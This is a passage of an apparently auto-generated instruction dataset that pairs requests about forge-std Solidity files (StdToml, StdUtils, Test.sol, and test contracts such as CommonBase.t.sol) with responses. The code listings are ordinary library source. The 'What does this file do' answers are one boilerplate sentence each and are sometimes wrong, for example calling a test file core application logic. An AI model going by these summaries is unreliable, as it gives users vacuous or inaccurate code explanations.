function redBytes(bytes memory self) internal pure returns (string memory) {\n        return red(vm.toString(self));\n    }\n\n    function redBytes32(bytes32 self) internal pure returns (string memory) {\n        return red(vm.toString(self));\n    }\n\n    function green(string memory self) internal pure returns (string memory) {\n        return styleConcat(GREEN, self);\n    }\n\n    function green(uint256 self) internal pure returns (string memory) {\n        return green(vm.toString(self));\n    }\n\n    fun\n```", "output": "This file `StdStyle.sol` is part of the src project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for StdToml.sol which is part of the src project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\src\\StdToml.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {VmSafe} from \"./Vm.sol\";\n\n// Helpers for parsing and writing TOML files\n// To parse:\n// ```\n// using stdToml for string;\n// string memory toml = vm.readFile(\"<some_path>\");\n// toml.readUint(\"<json_path>\");\n// ```\n// To write:\n// ```\n// using stdToml for string;\n// string memory json = \"json\";\n// json.serialize(\"a\", uint256(123));\n// string memory semiFinal = json.serialize(\"b\", string(\"test\"));\n// string memory finalJson = json.serialize(\"c\", semiFinal);\n// finalJson.write(\"<some_path>\");\n// ```\n\nlibrary stdToml {\n    VmSafe private constant vm = VmSafe(address(uint160(uint256(keccak256(\"hevm cheat code\")))));\n\n    function keyExists(string memory toml, string memory key) internal view returns (bool) {\n        return vm.keyExistsToml(toml, key);\n    }\n\n    function parseRaw(string memory toml, string memory key) internal pure returns (bytes memory) {\n        return vm.parseToml(toml, key);\n    }\n\n    function readUint(string memory toml, string memory key) internal pure returns (uint256) {\n        return vm.parseTomlUint(toml, key);\n    }\n\n    function readUintArray(string memory toml, string memory key) internal pure returns (uint256[] memory) {\n        return vm.parseTomlUintArray(toml, key);\n    }\n\n    function readInt(string memory toml, string memory key) internal pure returns (int256) {\n        return vm.parseTomlInt(toml, key);\n    }\n\n    function readIntArray(string memory toml, string memory key) internal pure returns (int256[] memory) {\n        return vm.parseTomlIntArray(toml, key);\n    }\n\n    function readBytes32(string memory toml, string memory key) internal pure returns (bytes32) {\n        return vm.parseTomlBytes32(toml, key);\n    }\n\n    function readBytes32Array(string memory toml, string memory key) internal pure returns (bytes32[] memory) {\n        return vm.parseTomlBytes32Array(toml, key);\n    }\n\n    function readString(string memory toml, string memory key) internal pure returns (string memory) {\n        return vm.parseTomlString(toml, key);\n    }\n\n    function readStringArray(string memory toml, string memory key) internal pure returns (string[] memory) {\n        return vm.parseTomlStringArray(toml, key);\n    }\n\n    function readAddress(string memory toml, string memory key) internal pure returns (address) {\n        return vm.parseTomlAddress(toml, key);\n    }\n\n    function readAddressArray(string memory toml, string memory key) internal pure returns (address[] memory) {\n        return vm.parseTomlAddressArray(toml, key);\n    }\n\n    function readBool(string memory toml, string memory key) internal pure returns (bool) {\n        return vm.parseTomlBool(toml, key);\n    }\n\n    function readBoolArray(string memory toml, string memory key) internal pure returns (bool[] memory) {\n        return vm.parseTomlBoolArray(toml, key);\n    }\n\n    function readBytes(string memory toml, string memory key) internal pure returns (bytes memory) {\n        return vm.parseTomlBytes(toml, key);\n    }\n\n    function readBytesArray(string memory toml, string memory key) internal pure returns (bytes[] memory) {\n        return vm.parseTomlBytesArray(toml, key);\n    }\n\n    function readUintOr(string memory toml, string memory key, uint256 defaultValue) internal view returns (uint256) {\n        return keyExists(toml, key) ? readUint(toml, key) : defaultValue;\n    }\n\n    function readUintArrayOr(string memory toml, string memory key, uint256[] memory defaultValue)\n        internal\n        view\n        returns (uint256[] memory)\n    {\n        return keyExists(toml, key) ? readUintArray(toml, key) : defaultValue;\n    }\n\n    function readIntOr(string memory toml, string memory key, int256 defaultValue) internal view returns (int256) {\n        return keyExists(toml, key) ? readInt(toml, key) : defaultValue;\n    }\n\n    function readIntArrayOr(string memory toml, string memory key, int256[] memory defaultValue)\n        internal\n        view\n        returns (int256[] memory)\n    {\n        return keyExists(toml, key) ? readIntArray(toml, key) : defaultValue;\n    }\n\n    function readBytes32Or(string memory toml, string memory key, bytes32 defaultValue)\n        internal\n        view\n        returns (bytes32)\n    {\n        return keyExists(toml, key) ? readBytes32(toml, key) : defaultValue;\n    }\n\n    function readBytes32ArrayOr(string memory toml, string memory key, bytes32[] memory defaultValue)\n        internal\n        view\n        returns (bytes32[] memory)\n    {\n        return keyExists(toml, key) ? readBytes32Array(toml, key) : defaultValue;\n    }\n\n    function readStringOr(string memory toml, string memory key, string memory defaultValue)\n        internal\n        view\n        returns (string memory)\n    {\n        return keyExists(toml, key) ? readString(toml, key) : defaultValue;\n    }\n\n    function readStringArrayOr(string memory toml, string memory key, string[] memory defaultValue)\n        internal\n        view\n        returns (string[] memory)\n    {\n        return keyExists(toml, key) ? readStringArray(toml, key) : defaultValue;\n    }\n\n    function readAddressOr(string memory toml, string memory key, address defaultValue)\n        internal\n        view\n        returns (address)\n    {\n        return keyExists(toml, key) ? readAddress(toml, key) : defaultValue;\n    }\n\n    function readAddressArrayOr(string memory toml, string memory key, address[] memory defaultValue)\n        internal\n        view\n        returns (address[] memory)\n    {\n        return keyExists(toml, key) ? readAddressArray(toml, key) : defaultValue;\n    }\n\n    function readBoolOr(string memory toml, string memory key, bool defaultValue) internal view returns (bool) {\n        return keyExists(toml, key) ? readBool(toml, key) : defaultValue;\n    }\n\n    function readBoolArrayOr(string memory toml, string memory key, bool[] memory defaultValue)\n        internal\n        view\n        returns (bool[] memory)\n    {\n        return keyExists(toml, key) ? readBoolArray(toml, key) : defaultValue;\n    }\n\n    function readBytesOr(string memory toml, string memory key, bytes memory defaultValue)\n        internal\n        view\n        returns (bytes memory)\n    {\n        return keyExists(toml, key) ? readBytes(toml, key) : defaultValue;\n    }\n\n    function readBytesArrayOr(string memory toml, string memory key, bytes[] memory defaultValue)\n        internal\n        view\n        returns (bytes[] memory)\n    {\n        return keyExists(toml, key) ? readBytesArray(toml, key) : defaultValue;\n    }\n\n    function serialize(string memory jsonKey, string memory rootObject) internal returns (string memory) {\n        return vm.serializeJson(jsonKey, rootObject);\n    }\n\n    function serialize(string memory jsonKey, string memory key, bool value) internal returns (string memory) {\n        return vm.serializeBool(jsonKey, key, value);\n    }\n\n    function serialize(string memory jsonKey, string memory key, bool[] memory value) internal returns (string memory) {\n        return vm.serializeBool(jsonKey, key, value);\n    }\n\n    function serialize(string memory jsonKey, string memory key, uint256 value) internal returns (string memory) {\n        return vm.serializeUint(jsonKey, key, value);\n    }\n\n    function serialize(string memory jsonKey, string memory key, uint256[] memory value)\n        internal\n        returns (string memory)\n    {\n        return vm.serializeUint(jsonKey, key, value);\n    }\n\n    function serialize(string memory jsonKey, string memory key, int256 value) internal returns (string memory) {\n        return vm.serializeInt(jsonKey, key, value);\n    }\n\n    function serialize(string memory jsonKey, string memory key, int256[] memory value)\n        internal\n        returns (string memory)\n    {\n        return vm.serializeInt(jsonKey, key, value);\n    }\n\n    function serialize(string memory jsonKey, string memory key, address value) internal returns (string memory) {\n        return vm.serializeAddress(jsonKey, key, value);\n    }\n\n    function serialize(string memory jsonKey, string memory key, address[] memory value)\n        internal\n        returns (string memory)\n    {\n        return vm.serializeAddress(jsonKey, key, value);\n    }\n\n    function serialize(string memory jsonKey, string memory key, bytes32 value) internal returns (string memory) {\n        return vm.serializeBytes32(jsonKey, key, value);\n    }\n\n    function serialize(string memory jsonKey, string memory key, bytes32[] memory value)\n        internal\n        returns (string memory)\n    {\n        return vm.serializeBytes32(jsonKey, key, value);\n    }\n\n    function serialize(string memory jsonKey, string memory key, bytes memory value) internal returns (string memory) {\n        return vm.serializeBytes(jsonKey, key, value);\n    }\n\n    function serialize(string memory jsonKey, string memory key, bytes[] memory value)\n        internal\n        returns (string memory)\n    {\n        return vm.serializeBytes(jsonKey, key, value);\n    }\n\n    function serialize(string memory jsonKey, string memory key, string memory value) internal returns (string memory) {\n        return vm.serializeString(jsonKey, key, value);\n    }\n\n    function serialize(string memory jsonKey, string memory key, string[] memory value)\n        internal\n        returns (string memory)\n    {\n        return vm.serializeString(jsonKey, key, value);\n    }\n\n    function write(string memory jsonKey, string memory path) internal {\n        vm.writeToml(jsonKey, path);\n    }\n\n    function write(string memory jsonKey, string memory path, string memory valueKey) internal {\n        vm.writeToml(jsonKey, path, valueKey);\n    }\n}\n\n```"}
{"instruction": "What does the file StdToml.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {VmSafe} from \"./Vm.sol\";\n\n// Helpers for parsing and writing TOML files\n// To parse:\n// ```\n// using stdToml for string;\n// string memory toml = vm.readFile(\"<some_path>\");\n// toml.readUint(\"<json_path>\");\n// ```\n// To write:\n// ```\n// using stdToml for string;\n// string memory json = \"json\";\n// json.serialize(\"a\", uint256(123));\n// string memory semiFinal = json.serialize(\"b\", string(\"test\"));\n// string memory finalJson = json.serialize(\"c\", semiFinal);\n// finalJson.write(\"<some_path>\");\n// ```\n\nlibrary stdToml {\n    VmSafe private constant vm = VmSafe(address(uint160(uint256(keccak256(\"hevm cheat code\")))));\n\n    function keyExists(string memory toml, string memory key) internal view returns (bool) {\n        return vm.keyExistsToml(toml, key);\n    }\n\n    function parseRaw(string memory toml, string memory key) internal pure returns (bytes memory) {\n        return vm.parseToml(toml, key);\n    }\n\n    function readUint(string memory toml, string memory key) internal pure returns (uint256) {\n        return vm.parseTomlUint(toml, key);\n    }\n\n    function readUintArray(string memory toml, string memory key) internal pure returns (uint256[] memory) {\n        return vm.parseTomlUintArray(toml, key);\n    }\n\n    function readInt(string memory toml, string memory key) internal pure returns (int256) {\n        return vm.parseTomlInt(toml, key);\n    }\n\n    function readIntArray(string memory toml, string memory key) internal pure returns (int256[] memory) {\n        return vm.parseTomlIntArray(toml, key);\n    }\n\n    function readBytes32(string memory toml, string memory key) internal pure returns (bytes32) {\n        return vm.parseTomlBytes32(toml, key);\n    }\n\n    function readBytes32Array(string memory toml, string memory key) internal pure returns (bytes32[] memory) {\n        return vm.parseTomlBytes32Array(toml, key);\n    }\n\n    function readString(string memory toml, string memory key) \n```", "output": "This file `StdToml.sol` is part of the src project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for StdUtils.sol which is part of the src project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\src\\StdUtils.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {IMulticall3} from \"./interfaces/IMulticall3.sol\";\nimport {StdConstants} from \"./StdConstants.sol\";\nimport {VmSafe} from \"./Vm.sol\";\n\nabstract contract StdUtils {\n    /*//////////////////////////////////////////////////////////////////////////\n                                     CONSTANTS\n    //////////////////////////////////////////////////////////////////////////*/\n\n    VmSafe private constant vm = VmSafe(address(uint160(uint256(keccak256(\"hevm cheat code\")))));\n    address private constant CONSOLE2_ADDRESS = 0x000000000000000000636F6e736F6c652e6c6f67;\n    uint256 private constant INT256_MIN_ABS =\n        57896044618658097711785492504343953926634992332820282019728792003956564819968;\n    uint256 private constant SECP256K1_ORDER =\n        115792089237316195423570985008687907852837564279074904382605163141518161494337;\n    uint256 private constant UINT256_MAX =\n        115792089237316195423570985008687907853269984665640564039457584007913129639935;\n\n    /*//////////////////////////////////////////////////////////////////////////\n                                 INTERNAL FUNCTIONS\n    //////////////////////////////////////////////////////////////////////////*/\n\n    function _bound(uint256 x, uint256 min, uint256 max) internal pure virtual returns (uint256 result) {\n        require(min <= max, \"StdUtils bound(uint256,uint256,uint256): Max is less than min.\");\n        // If x is between min and max, return x directly. This is to ensure that dictionary values\n        // do not get shifted if the min is nonzero. More info: https://github.com/foundry-rs/forge-std/issues/188\n        if (x >= min && x <= max) return x;\n\n        uint256 size = max - min + 1;\n\n        // If the value is 0, 1, 2, 3, wrap that to min, min+1, min+2, min+3. Similarly for the UINT256_MAX side.\n        // This helps ensure coverage of the min/max values.\n        if (x <= 3 && size > x) return min + x;\n        if (x >= UINT256_MAX - 3 && size > UINT256_MAX - x) return max - (UINT256_MAX - x);\n\n        // Otherwise, wrap x into the range [min, max], i.e. the range is inclusive.\n        if (x > max) {\n            uint256 diff = x - max;\n            uint256 rem = diff % size;\n            if (rem == 0) return max;\n            result = min + rem - 1;\n        } else if (x < min) {\n            uint256 diff = min - x;\n            uint256 rem = diff % size;\n            if (rem == 0) return min;\n            result = max - rem + 1;\n        }\n    }\n\n    function bound(uint256 x, uint256 min, uint256 max) internal pure virtual returns (uint256 result) {\n        result = _bound(x, min, max);\n    }\n\n    function _bound(int256 x, int256 min, int256 max) internal pure virtual returns (int256 result) {\n        require(min <= max, \"StdUtils bound(int256,int256,int256): Max is less than min.\");\n\n        // Shifting all int256 values to uint256 to use _bound function. The range of two types are:\n        // int256 : -(2**255) ~ (2**255 - 1)\n        // uint256:     0     ~ (2**256 - 1)\n        // So, add 2**255, INT256_MIN_ABS to the integer values.\n        //\n        // If the given integer value is -2**255, we cannot use `-uint256(-x)` because of the overflow.\n        // So, use `~uint256(x) + 1` instead.\n        uint256 _x = x < 0 ? (INT256_MIN_ABS - ~uint256(x) - 1) : (uint256(x) + INT256_MIN_ABS);\n        uint256 _min = min < 0 ? (INT256_MIN_ABS - ~uint256(min) - 1) : (uint256(min) + INT256_MIN_ABS);\n        uint256 _max = max < 0 ? (INT256_MIN_ABS - ~uint256(max) - 1) : (uint256(max) + INT256_MIN_ABS);\n\n        uint256 y = _bound(_x, _min, _max);\n\n        // To move it back to int256 value, subtract INT256_MIN_ABS at here.\n        result = y < INT256_MIN_ABS ? int256(~(INT256_MIN_ABS - y) + 1) : int256(y - INT256_MIN_ABS);\n    }\n\n    function bound(int256 x, int256 min, int256 max) internal pure virtual returns (int256 result) {\n        result = _bound(x, min, max);\n    }\n\n    function boundPrivateKey(uint256 privateKey) internal pure virtual returns (uint256 result) {\n        result = _bound(privateKey, 1, SECP256K1_ORDER - 1);\n    }\n\n    function bytesToUint(bytes memory b) internal pure virtual returns (uint256) {\n        require(b.length <= 32, \"StdUtils bytesToUint(bytes): Bytes length exceeds 32.\");\n        return abi.decode(abi.encodePacked(new bytes(32 - b.length), b), (uint256));\n    }\n\n    /// @dev Compute the address a contract will be deployed at for a given deployer address and nonce\n    function computeCreateAddress(address deployer, uint256 nonce) internal pure virtual returns (address) {\n        console2_log_StdUtils(\"computeCreateAddress is deprecated. Please use vm.computeCreateAddress instead.\");\n        return vm.computeCreateAddress(deployer, nonce);\n    }\n\n    function computeCreate2Address(bytes32 salt, bytes32 initcodeHash, address deployer)\n        internal\n        pure\n        virtual\n        returns (address)\n    {\n        console2_log_StdUtils(\"computeCreate2Address is deprecated. Please use vm.computeCreate2Address instead.\");\n        return vm.computeCreate2Address(salt, initcodeHash, deployer);\n    }\n\n    /// @dev returns the address of a contract created with CREATE2 using the default CREATE2 deployer\n    function computeCreate2Address(bytes32 salt, bytes32 initCodeHash) internal pure returns (address) {\n        console2_log_StdUtils(\"computeCreate2Address is deprecated. Please use vm.computeCreate2Address instead.\");\n        return vm.computeCreate2Address(salt, initCodeHash);\n    }\n\n    /// @dev returns the hash of the init code (creation code + no args) used in CREATE2 with no constructor arguments\n    /// @param creationCode the creation code of a contract C, as returned by type(C).creationCode\n    function hashInitCode(bytes memory creationCode) internal pure returns (bytes32) {\n        return hashInitCode(creationCode, \"\");\n    }\n\n    /// @dev returns the hash of the init code (creation code + ABI-encoded args) used in CREATE2\n    /// @param creationCode the creation code of a contract C, as returned by type(C).creationCode\n    /// @param args the ABI-encoded arguments to the constructor of C\n    function hashInitCode(bytes memory creationCode, bytes memory args) internal pure returns (bytes32) {\n        return keccak256(abi.encodePacked(creationCode, args));\n    }\n\n    // Performs a single call with Multicall3 to query the ERC-20 token balances of the given addresses.\n    function getTokenBalances(address token, address[] memory addresses)\n        internal\n        virtual\n        returns (uint256[] memory balances)\n    {\n        uint256 tokenCodeSize;\n        assembly {\n            tokenCodeSize := extcodesize(token)\n        }\n        require(tokenCodeSize > 0, \"StdUtils getTokenBalances(address,address[]): Token address is not a contract.\");\n\n        // ABI encode the aggregate call to Multicall3.\n        uint256 length = addresses.length;\n        IMulticall3.Call[] memory calls = new IMulticall3.Call[](length);\n        for (uint256 i = 0; i < length; ++i) {\n            // 0x70a08231 = bytes4(\"balanceOf(address)\"))\n            calls[i] = IMulticall3.Call({target: token, callData: abi.encodeWithSelector(0x70a08231, (addresses[i]))});\n        }\n\n        // Make the aggregate call.\n        (, bytes[] memory returnData) = StdConstants.MULTICALL3_ADDRESS.aggregate(calls);\n\n        // ABI decode the return data and return the balances.\n        balances = new uint256[](length);\n        for (uint256 i = 0; i < length; ++i) {\n            balances[i] = abi.decode(returnData[i], (uint256));\n        }\n    }\n\n    /*//////////////////////////////////////////////////////////////////////////\n                                 PRIVATE FUNCTIONS\n    //////////////////////////////////////////////////////////////////////////*/\n\n    function addressFromLast20Bytes(bytes32 bytesValue) private pure returns (address) {\n        return address(uint160(uint256(bytesValue)));\n    }\n\n    // This section is used to prevent the compilation of console, which shortens the compilation time when console is\n    // not used elsewhere. We also trick the compiler into letting us make the console log methods as `pure` to avoid\n    // any breaking changes to function signatures.\n    function _castLogPayloadViewToPure(function(bytes memory) internal view fnIn)\n        internal\n        pure\n        returns (function(bytes memory) internal pure fnOut)\n    {\n        assembly {\n            fnOut := fnIn\n        }\n    }\n\n    function _sendLogPayload(bytes memory payload) internal pure {\n        _castLogPayloadViewToPure(_sendLogPayloadView)(payload);\n    }\n\n    function _sendLogPayloadView(bytes memory payload) private view {\n        uint256 payloadLength = payload.length;\n        address consoleAddress = CONSOLE2_ADDRESS;\n        assembly (\"memory-safe\") {\n            let payloadStart := add(payload, 32)\n            let r := staticcall(gas(), consoleAddress, payloadStart, payloadLength, 0, 0)\n        }\n    }\n\n    function console2_log_StdUtils(string memory p0) private pure {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string)\", p0));\n    }\n\n    function console2_log_StdUtils(string memory p0, uint256 p1) private pure {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,uint256)\", p0, p1));\n    }\n\n    function console2_log_StdUtils(string memory p0, string memory p1) private pure {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string)\", p0, p1));\n    }\n}\n\n```"}
{"instruction": "What does the file StdUtils.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {IMulticall3} from \"./interfaces/IMulticall3.sol\";\nimport {StdConstants} from \"./StdConstants.sol\";\nimport {VmSafe} from \"./Vm.sol\";\n\nabstract contract StdUtils {\n    /*//////////////////////////////////////////////////////////////////////////\n                                     CONSTANTS\n    //////////////////////////////////////////////////////////////////////////*/\n\n    VmSafe private constant vm = VmSafe(address(uint160(uint256(keccak256(\"hevm cheat code\")))));\n    address private constant CONSOLE2_ADDRESS = 0x000000000000000000636F6e736F6c652e6c6f67;\n    uint256 private constant INT256_MIN_ABS =\n        57896044618658097711785492504343953926634992332820282019728792003956564819968;\n    uint256 private constant SECP256K1_ORDER =\n        115792089237316195423570985008687907852837564279074904382605163141518161494337;\n    uint256 private constant UINT256_MAX =\n        115792089237316195423570985008687907853269984665640564039457584007913129639935;\n\n    /*//////////////////////////////////////////////////////////////////////////\n                                 INTERNAL FUNCTIONS\n    //////////////////////////////////////////////////////////////////////////*/\n\n    function _bound(uint256 x, uint256 min, uint256 max) internal pure virtual returns (uint256 result) {\n        require(min <= max, \"StdUtils bound(uint256,uint256,uint256): Max is less than min.\");\n        // If x is between min and max, return x directly. This is to ensure that dictionary values\n        // do not get shifted if the min is nonzero. More info: https://github.com/foundry-rs/forge-std/issues/188\n        if (x >= min && x <= max) return x;\n\n        uint256 size = max - min + 1;\n\n        // If the value is 0, 1, 2, 3, wrap that to min, min+1, min+2, min+3. Similarly for the UINT256_MAX side.\n        // This helps ensure coverage of the min/max values.\n        if (x <= 3 && size > x) return min + x;\n        if (\n```", "output": "This file `StdUtils.sol` is part of the src project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for Test.sol which is part of the src project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\src\\Test.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\n// ðŸ’¬ ABOUT\n// Forge Std's default Test.\n\n// ðŸ§© MODULES\nimport {console} from \"./console.sol\";\nimport {console2} from \"./console2.sol\";\nimport {safeconsole} from \"./safeconsole.sol\";\nimport {StdAssertions} from \"./StdAssertions.sol\";\nimport {StdChains} from \"./StdChains.sol\";\nimport {StdCheats} from \"./StdCheats.sol\";\nimport {StdConstants} from \"./StdConstants.sol\";\nimport {stdError} from \"./StdError.sol\";\nimport {StdInvariant} from \"./StdInvariant.sol\";\nimport {stdJson} from \"./StdJson.sol\";\nimport {stdMath} from \"./StdMath.sol\";\nimport {StdStorage, stdStorage} from \"./StdStorage.sol\";\nimport {StdStyle} from \"./StdStyle.sol\";\nimport {stdToml} from \"./StdToml.sol\";\nimport {StdUtils} from \"./StdUtils.sol\";\nimport {Vm} from \"./Vm.sol\";\n\n// ðŸ“¦ BOILERPLATE\nimport {TestBase} from \"./Base.sol\";\n\n// â­ï¸ TEST\nabstract contract Test is TestBase, StdAssertions, StdChains, StdCheats, StdInvariant, StdUtils {\n    // Note: IS_TEST() must return true.\n    bool public IS_TEST = true;\n}\n\n```"}
{"instruction": "What does the file Test.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\n// ðŸ’¬ ABOUT\n// Forge Std's default Test.\n\n// ðŸ§© MODULES\nimport {console} from \"./console.sol\";\nimport {console2} from \"./console2.sol\";\nimport {safeconsole} from \"./safeconsole.sol\";\nimport {StdAssertions} from \"./StdAssertions.sol\";\nimport {StdChains} from \"./StdChains.sol\";\nimport {StdCheats} from \"./StdCheats.sol\";\nimport {StdConstants} from \"./StdConstants.sol\";\nimport {stdError} from \"./StdError.sol\";\nimport {StdInvariant} from \"./StdInvariant.sol\";\nimport {stdJson} from \"./StdJson.sol\";\nimport {stdMath} from \"./StdMath.sol\";\nimport {StdStorage, stdStorage} from \"./StdStorage.sol\";\nimport {StdStyle} from \"./StdStyle.sol\";\nimport {stdToml} from \"./StdToml.sol\";\nimport {StdUtils} from \"./StdUtils.sol\";\nimport {Vm} from \"./Vm.sol\";\n\n// ðŸ“¦ BOILERPLATE\nimport {TestBase} from \"./Base.sol\";\n\n// â­ï¸ TEST\nabstract contract Test is TestBase, StdAssertions, StdChains, StdCheats, StdInvariant, StdUtils {\n    // Note: IS_TEST() must return true.\n    bool public IS_TEST = true;\n}\n\n```", "output": "This file `Test.sol` is part of the src project. Based on the code structure, it appears to handle testing and validation."}
{"instruction": "Show me the code for CommonBase.t.sol which is part of the test project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\test\\CommonBase.t.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {CommonBase} from \"../src/Base.sol\";\nimport {StdConstants} from \"../src/StdConstants.sol\";\nimport {Test} from \"../src/Test.sol\";\n\ncontract CommonBaseTest is Test {\n    function testVmAddressValue() public pure {\n        assertEq(VM_ADDRESS, address(StdConstants.VM));\n    }\n\n    function testConsoleValue() public pure {\n        assertEq(CONSOLE, StdConstants.CONSOLE);\n    }\n\n    function testCreate2FactoryValue() public pure {\n        assertEq(CREATE2_FACTORY, StdConstants.CREATE2_FACTORY);\n    }\n\n    function testDefaultSenderValue() public pure {\n        assertEq(DEFAULT_SENDER, StdConstants.DEFAULT_SENDER);\n    }\n\n    function testDefaultTestContractValue() public pure {\n        assertEq(DEFAULT_TEST_CONTRACT, StdConstants.DEFAULT_TEST_CONTRACT);\n    }\n\n    function testMulticall3AddressValue() public pure {\n        assertEq(MULTICALL3_ADDRESS, address(StdConstants.MULTICALL3_ADDRESS));\n    }\n\n    function testSecp256k1OrderValue() public pure {\n        assertEq(SECP256K1_ORDER, StdConstants.SECP256K1_ORDER);\n    }\n\n    function testUint256MaxValue() public pure {\n        assertEq(UINT256_MAX, type(uint256).max);\n    }\n\n    function testVmValue() public pure {\n        assertEq(address(vm), address(StdConstants.VM));\n    }\n}\n\n```"}
{"instruction": "What does the file CommonBase.t.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {CommonBase} from \"../src/Base.sol\";\nimport {StdConstants} from \"../src/StdConstants.sol\";\nimport {Test} from \"../src/Test.sol\";\n\ncontract CommonBaseTest is Test {\n    function testVmAddressValue() public pure {\n        assertEq(VM_ADDRESS, address(StdConstants.VM));\n    }\n\n    function testConsoleValue() public pure {\n        assertEq(CONSOLE, StdConstants.CONSOLE);\n    }\n\n    function testCreate2FactoryValue() public pure {\n        assertEq(CREATE2_FACTORY, StdConstants.CREATE2_FACTORY);\n    }\n\n    function testDefaultSenderValue() public pure {\n        assertEq(DEFAULT_SENDER, StdConstants.DEFAULT_SENDER);\n    }\n\n    function testDefaultTestContractValue() public pure {\n        assertEq(DEFAULT_TEST_CONTRACT, StdConstants.DEFAULT_TEST_CONTRACT);\n    }\n\n    function testMulticall3AddressValue() public pure {\n        assertEq(MULTICALL3_ADDRESS, address(StdConstants.MULTICALL3_ADDRESS));\n    }\n\n    function testSecp256k1OrderValue() public pure {\n        assertEq(SECP256K1_ORDER, StdConstants.SECP256K1_ORDER);\n    }\n\n    function testUint256MaxValue() public pure {\n        assertEq(UINT256_MAX, type(uint256).max);\n    }\n\n    function testVmValue() public pure {\n        assertEq(address(vm), address(StdConstants.VM));\n    }\n}\n\n```", "output": "This file `CommonBase.t.sol` is part of the test project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for Config.t.sol which is part of the test project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\test\\Config.t.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity ^0.8.13;\n\nimport {Test} from \"../src/Test.sol\";\nimport {Config} from \"../src/Config.sol\";\nimport {StdConfig} from \"../src/StdConfig.sol\";\n\ncontract ConfigTest is Test, Config {\n    function setUp() public {\n        vm.setEnv(\"MAINNET_RPC\", \"https://reth-ethereum.ithaca.xyz/rpc\");\n        vm.setEnv(\"WETH_MAINNET\", \"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2\");\n        vm.setEnv(\"OPTIMISM_RPC\", \"https://mainnet.optimism.io\");\n        vm.setEnv(\"WETH_OPTIMISM\", \"0x4200000000000000000000000000000000000006\");\n    }\n\n    function test_loadConfig() public {\n        // Deploy the config contract with the test fixture.\n        _loadConfig(\"./test/fixtures/config.toml\", false);\n\n        // -- MAINNET --------------------------------------------------------------\n\n        // Read and assert RPC URL for Mainnet (chain ID 1)\n        assertEq(config.getRpcUrl(1), \"https://reth-ethereum.ithaca.xyz/rpc\");\n\n        // Read and assert boolean values\n        assertTrue(config.get(1, \"is_live\").toBool());\n        bool[] memory bool_array = config.get(1, \"bool_array\").toBoolArray();\n        assertTrue(bool_array[0]);\n        assertFalse(bool_array[1]);\n\n        // Read and assert address values\n        assertEq(config.get(1, \"weth\").toAddress(), 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n        address[] memory address_array = config.get(1, \"deps\").toAddressArray();\n        assertEq(address_array[0], 0x0000000000000000000000000000000000000000);\n        assertEq(address_array[1], 0x1111111111111111111111111111111111111111);\n\n        // Read and assert bytes32 values\n        assertEq(config.get(1, \"word\").toBytes32(), bytes32(uint256(1234)));\n        bytes32[] memory bytes32_array = config.get(1, \"word_array\").toBytes32Array();\n        assertEq(bytes32_array[0], bytes32(uint256(5678)));\n        assertEq(bytes32_array[1], bytes32(uint256(9999)));\n\n        // Read and assert uint values\n        assertEq(config.get(1, \"number\").toUint256(), 1234);\n        uint256[] memory uint_array = config.get(1, \"number_array\").toUint256Array();\n        assertEq(uint_array[0], 5678);\n        assertEq(uint_array[1], 9999);\n\n        // Read and assert int values\n        assertEq(config.get(1, \"signed_number\").toInt256(), -1234);\n        int256[] memory int_array = config.get(1, \"signed_number_array\").toInt256Array();\n        assertEq(int_array[0], -5678);\n        assertEq(int_array[1], 9999);\n\n        // Read and assert bytes values\n        assertEq(config.get(1, \"b\").toBytes(), hex\"abcd\");\n        bytes[] memory bytes_array = config.get(1, \"b_array\").toBytesArray();\n        assertEq(bytes_array[0], hex\"dead\");\n        assertEq(bytes_array[1], hex\"beef\");\n\n        // Read and assert string values\n        assertEq(config.get(1, \"str\").toString(), \"foo\");\n        string[] memory string_array = config.get(1, \"str_array\").toStringArray();\n        assertEq(string_array[0], \"bar\");\n        assertEq(string_array[1], \"baz\");\n\n        // -- OPTIMISM ------------------------------------------------------------\n\n        // Read and assert RPC URL for Optimism (chain ID 10)\n        assertEq(config.getRpcUrl(10), \"https://mainnet.optimism.io\");\n\n        // Read and assert boolean values\n        assertFalse(config.get(10, \"is_live\").toBool());\n        bool_array = config.get(10, \"bool_array\").toBoolArray();\n        assertFalse(bool_array[0]);\n        assertTrue(bool_array[1]);\n\n        // Read and assert address values\n        assertEq(config.get(10, \"weth\").toAddress(), 0x4200000000000000000000000000000000000006);\n        address_array = config.get(10, \"deps\").toAddressArray();\n        assertEq(address_array[0], 0x2222222222222222222222222222222222222222);\n        assertEq(address_array[1], 0x3333333333333333333333333333333333333333);\n\n        // Read and assert bytes32 values\n        